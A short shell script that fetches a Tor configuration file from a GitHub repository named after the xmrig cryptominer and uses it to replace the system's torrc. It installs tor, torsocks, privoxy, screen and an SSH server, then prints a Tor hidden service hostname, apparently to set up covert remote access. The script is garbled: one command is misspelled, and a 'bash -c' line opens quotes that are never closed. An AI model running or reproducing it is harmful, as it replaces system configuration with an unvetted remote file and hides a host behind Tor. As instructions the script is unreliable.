wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/torrc
sudo apt get install net-tools
sudo apt-get install openssh-server
sudo apt-get install torsocks
sudo apt install -y tor
sudo apt install -y screen
sudo apt install privoxy
sudo apt-get update && sudo apt-get upgrade -y 
sudo apt update && sudo apt upgrade 

sudo /etc/init.d/tor stop

sudo rm /etc/tor/torrc
sudo cp torrc /etc/tor/torrc

sudo /etc/init.d/tor start
bash -c 'echo "

cat /var/lib/tor/other_hidden_service/hostname
